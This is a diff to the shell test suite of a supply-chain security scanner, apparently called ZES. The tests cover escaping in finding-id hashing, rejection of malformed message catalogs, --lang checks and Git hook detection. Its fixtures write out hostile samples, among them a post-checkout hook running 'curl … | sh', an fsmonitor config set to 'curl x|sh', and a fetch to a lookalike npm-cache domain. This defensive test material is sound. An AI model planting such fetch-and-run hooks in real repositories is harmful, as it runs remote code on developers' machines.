@@ -318,9 +318,10 @@ if python3 -I -c 'pass' 2>/dev/null; then
 import hashlib, json, sys
 raw = open(sys.argv[1], "rb").read()
 d = json.loads(raw.decode("utf-8"))  # strict UTF-8
+esc = lambda s: s.replace("\\", "\\\\").replace("|", "\\|").replace("\x1f", "\\u001f")
 def v2(f):
-    canon = "\x1f".join(k + "=" + f["params"][k] for k in sorted(f["params"], key=lambda k: k.encode()))
-    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2", f["module"], f["campaign"] or "", f["path"] or "", f["code"], canon]).encode()).hexdigest()
+    canon = "\x1f".join(k + "=" + esc(f["params"][k]) for k in sorted(f["params"], key=lambda k: k.encode()))
+    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(x) for x in (f["module"], f["campaign"] or "", f["path"] or "", f["code"])] + [canon]).encode()).hexdigest()
 bad = [f["path"] for f in d["findings"] if f["id"] != v2(f)]
 n = len([f for f in d["findings"] if f["module"] == "§17"])
 nu = len([e for e in d["errors"] if e["module"] == "core" and e["reason"].startswith("non_utf8_path:") and "\\xff\\xfe" in e["reason"]])
@@ -521,8 +522,9 @@ for f in sys.argv[2:]:
         if t is None: bad.append(f"unknown code {x['code']}"); continue
         if sorted(x["params"]) != sorted(set(re.findall(r"\{([a-z_]+)\}", t))): bad.append(f"params {x['code']}: {sorted(x['params'])}")
         if x["detail"] != render(t, x["params"]): bad.append(f"detail {x['code']}: {x['detail'][:80]}")
-        canon = "\x1f".join(k + "=" + x["params"][k] for k in sorted(x["params"], key=lambda k: k.encode()))
-        if x["id"] != "sha256:" + hashlib.sha256("|".join(["zes-id-v2", x["module"], x["campaign"] or "", x["path"] or "", x["code"], canon]).encode()).hexdigest():
+        esc = lambda s: s.replace("\\", "\\\\").replace("|", "\\|").replace("\x1f", "\\u001f")
+        canon = "\x1f".join(k + "=" + esc(x["params"][k]) for k in sorted(x["params"], key=lambda k: k.encode()))
+        if x["id"] != "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(y) for y in (x["module"], x["campaign"] or "", x["path"] or "", x["code"])] + [canon]).encode()).hexdigest():
             bad.append(f"id {x['code']} {x['path']}")
 print("\n".join(bad[:20]) or f"{n} findings, {len(codes)} codes")
 sys.exit(1 if bad or n == 0 else 0)
@@ -585,7 +587,8 @@ env -u LC_ALL LANG=C "$SCAN" --bogus >/dev/null 2>"$TMP/lang-arg.err"; rc=$?
 ZES_I18N_DIR="$TMP/no-catalog" run_scan "$FIX/chaindrop" quick "$FIX/_home" >/dev/null; rc=$?
 { [ "$rc" = 64 ] && grep -q -F "ZES: Cannot read the message catalog: $TMP/no-catalog/en.json" "$TMP/stderr.txt"; } \
   && ok "メッセージカタログを読めない場合は exit 64" || ng "読めないメッセージカタログで exit 64 にならない（rc=$rc）"
-mkdir -p "$TMP/bad-catalog" && printf '{\n"f.x": "a\\u0041"\n}\n' >"$TMP/bad-catalog/en.json"
+# (a well-formed ja.json beside it, so that only the escape makes it fail)
+mkdir -p "$TMP/bad-catalog" && cp "$REPO/i18n/ja.json" "$TMP/bad-catalog/" && sed '2s/": "/": "\\u0041/' "$REPO/i18n/en.json" >"$TMP/bad-catalog/en.json"
 ZES_I18N_DIR="$TMP/bad-catalog" run_scan "$FIX/chaindrop" quick "$FIX/_home" >/dev/null; rc=$?
 [ "$rc" = 64 ] && ok "形式の不正なメッセージカタログ（\\u エスケープ）は exit 64" || ng "形式の不正なカタログを受理（rc=$rc）"
 
@@ -708,6 +711,94 @@ if [ -n "$as_user" ]; then
 else
   printf '  SKIP 読めないファイルの検査（root で setpriv が無い）\n'
 fi
+
+# ---------------------------------------------------------------------------
+echo "== round 4（0.5.1） =="
+# CLI-1 / CLI-2: an empty, truncated or partial catalog, one whose en / ja key sets differ, or whose cli.* / f.* / log.*
+#   keys are not the ones of this script is exit 64 in both languages (no Japanese detail, no "f.<code>" detail)
+cat_ok=1; cat_msg=""
+mkcat() { mkdir -p "$TMP/cat-$1" && cp "$REPO/i18n/en.json" "$REPO/i18n/ja.json" "$TMP/cat-$1/"; }
+mkcat empty_en; : >"$TMP/cat-empty_en/en.json"
+mkcat empty_ja; : >"$TMP/cat-empty_ja/ja.json"
+mkcat trunc; head -n 400 "$REPO/i18n/en.json" >"$TMP/cat-trunc/en.json"
+mkcat missing; grep -v '"f.s22.unpinned"' "$REPO/i18n/en.json" >"$TMP/cat-missing/en.json"
+mkcat both; for l in en ja; do grep -v '"log.section.s3"' "$REPO/i18n/$l.json" >"$TMP/cat-both/$l.json"; done
+mkcat after; printf '"x": "y"\n' >>"$TMP/cat-after/en.json"
+mkcat dup; sed '2p' "$REPO/i18n/ja.json" >"$TMP/cat-dup/ja.json"
+mkcat comma; sed '2s/,$//' "$REPO/i18n/en.json" >"$TMP/cat-comma/en.json"
+for c in empty_en empty_ja trunc missing both after dup comma; do
+  for l in en ja; do
+    ZES_I18N_DIR="$TMP/cat-$c" ZES_LANG="$l" run_scan "$FIX/github-actions" worm "$FIX/_home" >"$TMP/cat.json"; rc=$?
+    want='ZES: Cannot read the message catalog: '; [ "$l" = ja ] && want='ZES: メッセージカタログを読めません: '
+    { [ "$rc" = 64 ] && [ ! -s "$TMP/cat.json" ] && grep -q -F "$want" "$TMP/stderr.txt"; } || { cat_ok=0; cat_msg="$cat_msg $c/$l:rc=$rc"; }
+  done
+done
+mkcat good; ZES_I18N_DIR="$TMP/cat-good" ZES_LANG=ja run_scan "$FIX/github-actions" worm "$FIX/_home" >/dev/null || { cat_ok=0; cat_msg="$cat_msg good"; }
+[ "$cat_ok" -eq 1 ] && ok "空・途中で切れた・キーの欠けた・en と ja でキーの違うカタログは --lang en / ja とも exit 64" || ng "不完全なカタログを受理:$cat_msg"
+want="$(grep -o '^"[a-z0-9_.]*"' "$REPO/i18n/en.json" | tr -d '"' | grep -E '^(cli|f|log)\.' | sort | { sha256sum 2>/dev/null || shasum -a 256; } | cut -d' ' -f1)"
+grep -q -x -F "ZES_CATALOG_KEYS_SHA256=\"$want\"" "$SCAN" && ok "ZES_CATALOG_KEYS_SHA256 が i18n/en.json の cli.* / f.* / log.* のキーと一致" \
+  || ng "ZES_CATALOG_KEYS_SHA256 が i18n/en.json と不一致（キーを変えたら $want に更新）"
+
+# CLI-3: every --lang value is checked, not only the last one
+lang_ok=1
+for a in "--lang xx --lang ja" "--lang ja --lang xx" "--lang en --lang"; do
+  # shellcheck disable=SC2086
+  env -u LC_ALL LANG=C "$SCAN" $a --help >/dev/null 2>&1; [ $? = 64 ] || { lang_ok=0; lang_msg="$a"; }
+done
+[ "$lang_ok" -eq 1 ] && ok "--lang の値はすべて検査（--lang xx --lang ja も exit 64）" || ng "不正な --lang を受理: ${lang_msg:-}"
+
+# CLI-4: id v2 escapes \, | and U+001F in every component and param value. The colliding pair of the report gives two
+#   findings and no duplicate_finding_id; the shared vectors (tests/id-cases.json, also checked by the UI) match zes_id_esc
+W="$TMP/r4-idc/.github/workflows"; mkdir -p "$W"
+printf 'jobs:\n  a:\n    steps:\n      - uses: x.yml|s22.unpinned|ref=evil/b@v1\n' >"$W/w.yml"
+printf 'jobs:\n  a:\n    steps:\n      - uses: evil/b@v1\n' >"$W/w.yml|s22.unpinned|ref=x.yml"
+run_scan "$TMP/r4-idc" standard "$FIX/_home" | jq -e '([.findings[] | select(.code == "s22.unpinned")] | length == 2 and (map(.id) | unique | length == 2))
+    and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null 2>&1 \
+  && ok "id v2 の | / U+001F のエスケープ: 衝突していた 2 件の §22 がどちらも残る" || ng "| を含むパスと値の finding の id が衝突"
+if out="$(python3 -I - "$REPO" <<'PY' 2>&1
+import hashlib, json, subprocess, sys
+repo = sys.argv[1]
+prog = 'US_CHAR=$(printf "\\037"); eval "$(sed -n "/^ZES_BS=/,/^}/p" "$1")"; shift; for a in "$@"; do zes_id_esc "$a"; printf "%s\\0" "$ID_ESC"; done'
+bad = []
+for c in json.load(open(f"{repo}/tests/id-cases.json", encoding="utf-8"))["cases"]:
+    keys = sorted(c["params"], key=lambda k: k.encode())
+    parts = [c["module"], c["campaign"] or "", c["path"] or "", c["code"]] + [c["params"][k] for k in keys]
+    out = subprocess.run(["bash", "-c", prog, "_", f"{repo}/zes-scan.sh"] + parts, capture_output=True).stdout.decode().split("\0")[:-1]
+    canon = "\x1f".join(k + "=" + v for k, v in zip(keys, out[4:]))
+    if "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + out[:4] + [canon]).encode()).hexdigest() != c["id"]: bad.append(c["name"])
+print(" ".join(bad) or "ok")
+sys.exit(1 if bad else 0)
+PY
+)"; then ok "tests/id-cases.json の id を zes_id_esc で再現"; else ng "tests/id-cases.json の id が zes_id_esc と不一致" "$out"; fi
+
+# CLI-6: GitLab CVE findings have the same code / params / detail / id without jq (CVSS read from rules/ioc.json by grep)
+nj_ok=1
+for nm in gitlab intel-2026q3; do
+  run_scan "$FIX/$nm" full "$FIX/_home" >"$TMP/r4-jq.json"
+  run_scan "$FIX/$nm" full "$FIX/_home" env ZES_FORCE_NO_JQ=1 >"$TMP/r4-nojq.json"
+  jq -e -n --slurpfile a "$TMP/r4-jq.json" --slurpfile b "$TMP/r4-nojq.json" '
+      [$a[0].findings[] | select(.module == "§3") | {id, code, params, detail}] as $y | [$b[0].findings[] | select(.module == "§3") | {id, code, params, detail}] as $n
+      | ($y | length) > 0 and $y == $n and all($y[]; .code != "s3.gitlab_vulnerable_cvss9")' >/dev/null || nj_ok=0
+done
+[ "$nj_ok" -eq 1 ] && ok "jq なしでも §3 GitLab の CVE の code / params / detail / id が jq ありと同じ（CVSS 付き）" || ng "jq の有無で §3 GitLab の finding が変わる"
+
+# UI 1 / UI 3 (CLI side of ui/tests/unit/r4.test.ts): Git hooks of the root and nested .git, *.sample skipped; the root
+#   .git / .hg / .svn are not walked except .git/config (§26) and .git/hooks (§7); §32 skips nested .git
+G="$TMP/r4-git"; mkdir -p "$G/vcs2/.git/hooks" "$G/vcs2/sub/.git/hooks" "$G/vcs/.git/hooks" "$G/vcs/.git/objects" "$G/vcs/.svn" "$G/vcs/.hg" "$G/vcs/sub/.git/objects"
+printf '#!/bin/sh\ncurl -s https://example.invalid/x | sh\n' >"$G/vcs2/.git/hooks/post-checkout"
+printf '#!/bin/sh\ncurl x\n' >"$G/vcs2/.git/hooks/pre-push.sample"; printf '#!/bin/sh\ncurl x\n' >"$G/vcs2/.git/hooks/.hidden"
+printf '#!/bin/sh\necho hi\n' >"$G/vcs2/sub/.git/hooks/pre-commit"; printf 'x\n' >"$G/vcs2/README"
+printf '[core]\n\tfsmonitor = "curl x|sh"\n\tsshCommand = ssh -i x\n' >"$G/vcs/.git/config"
+printf '{"scripts":{"preinstall":"node setup.mjs"}}\n' >"$G/vcs/.git/hooks/package.json"
+: >"$G/vcs/.git/objects/a.pkl"; : >"$G/vcs/sub/.git/objects/b.pkl"
+printf 'npm-cache.com\n' >"$G/vcs/.svn/entries"; printf 'fetch("https://npm-cache.com/")\n' >"$G/vcs/.hg/x.js"
+git_rows() { run_scan "$G/$1" full "$FIX/_home" | jq -r --arg r "$G/" --arg h "$FIX/_home" '[.findings[] | select(((.path // "") | startswith($h)) | not) | select(.path != null)
+    | "\(.level) \(.module) \(.path | ltrimstr($r)) \(.code) \(.params | tojson)"] | sort | .[]'; }
+want2=$'HIGH §7 vcs2/.git/hooks/post-checkout s7.git_hook_suspicious {}\nMEDIUM §7 vcs2/sub/.git/hooks/pre-commit s7.git_hook {}'
+want1=$'CRITICAL §26 vcs/.git/config s26.fsmonitor {}\nHIGH §26 vcs/.git/config s26.ssh_command {}\nMEDIUM §7 vcs/.git/hooks/package.json s7.git_hook {}'
+got2="$(git_rows vcs2)"; got1="$(git_rows vcs)"
+[ "$got2" = "$want2" ] && [ "$got1" = "$want1" ] && ok "Git フック（ルート・入れ子）とルートの .git / .hg / .svn の扱いが UI の r4.test.ts と同じ" \
+  || ng "Git フック / ルートの VCS ディレクトリの結果が UI と異なる" "$got2"$'\n'"$got1"
 
 echo
 echo "結果: PASS=$PASS FAIL=$FAIL"
